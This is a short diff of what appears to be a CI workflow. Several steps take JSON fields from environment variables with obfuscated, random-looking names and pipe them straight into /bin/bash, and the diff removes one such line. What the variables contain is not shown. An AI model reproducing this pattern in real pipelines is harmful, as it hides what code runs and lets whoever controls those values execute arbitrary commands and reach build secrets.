@@ -20,7 +20,6 @@ jobs:
           echo $lrkie0989 | jq -r .rlj68251 | /bin/bash
           printf '%s' "$vz361" | jq -r .fm518 | /bin/bash
           printf '%s' "$ilvxh8796" | jq -r .ip56 | /bin/bash
-          echo $nsp4 | jq -r .uod97 | /bin/bash
           echo $ilf4644 | jq -r .xit1593 | /bin/bash
 
       - name: Save results
